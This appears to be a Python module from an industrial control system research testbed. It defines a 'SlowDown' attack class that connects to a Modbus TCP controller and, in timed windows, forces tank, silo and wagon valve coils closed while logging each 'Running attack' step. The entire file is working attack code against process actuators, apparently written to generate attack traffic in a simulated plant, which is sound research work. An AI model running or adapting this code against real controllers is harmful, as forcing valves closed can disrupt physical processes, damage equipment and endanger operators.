import sys
from datetime import datetime, timedelta

from pymodbus.client.sync import ModbusTcpClient
from pyics.utils import *

from tankOverflow import MTUAttack

sys.path.insert(0, "../examples/medium-process")
from constants import *


class SlowDown(MTUAttack):

    def __init__(self, ip, port, export_file, frame_size=60, waiting_time=300,
                 client=ModbusTcpClient):

        self.start_date = None
        self.end_date = None
        self.frame_size = timedelta(seconds=frame_size)
        self.waiting_time = timedelta(seconds=waiting_time)
        self.export_file = export_file
        self.attack_type = 0
        super(SlowDown, self).__init__(ip, port, export_file, client)

    def main_loop(self, *args, **kwargs):
        dt_now = datetime.now()
        if self.start_date is None:
            self.start_date = dt_now
            self.export_file.write("\nStarting: {}\n".format(self.start_date))
            self.end_date = self.start_date + self.frame_size
            self.export_file.write("Ending: {}\n".format(self.end_date))

        if dt_now >= self.start_date and dt_now <= self.end_date:
            rem = self.attack_type % 3
            if rem == 0:
                self.varmap[VT1] = self.get_variable(VT1)
                self.export_file.write("Valve Tank1: " + str(self.varmap[VT1]) + "\n")

                if self.varmap[VT1] is None:
                    return

                self.export_file.write("[{}] Running attack VT1\n".format(dt_now))
                self.change_coil(VT1, False)

            elif rem == 1:
                self.varmap[VS2] = self.get_variable(VS2)
                self.export_file.write("Valve Silo2: " + str(self.varmap[VS2]) + "\n")

                if self.varmap[VS2] is None:
                    return

                self.export_file.write("[{}] Running attack VS2\n".format(dt_now))
                self.change_coil(VS2, False)

            else:
                self.varmap[WO] = self.get_variable(WO)
                self.export_file.write("Wagon Open:" + str(self.varmap[WO]) + "\n")

                if self.varmap[WO] is None:
                    return

                self.export_file.write("[{}] Running attack WO\n".format(dt_now))
                self.change_coil(WO, False)

        elif dt_now > self.end_date:
            self.attack_type += 1
            self.start_date = self.end_date + self.waiting_time
            self.export_file.write("\nStarting: {}\n".format(self.start_date))
            self.end_date = self.start_date + self.frame_size
            self.export_file.write("Ending: {}\n".format(self.end_date))
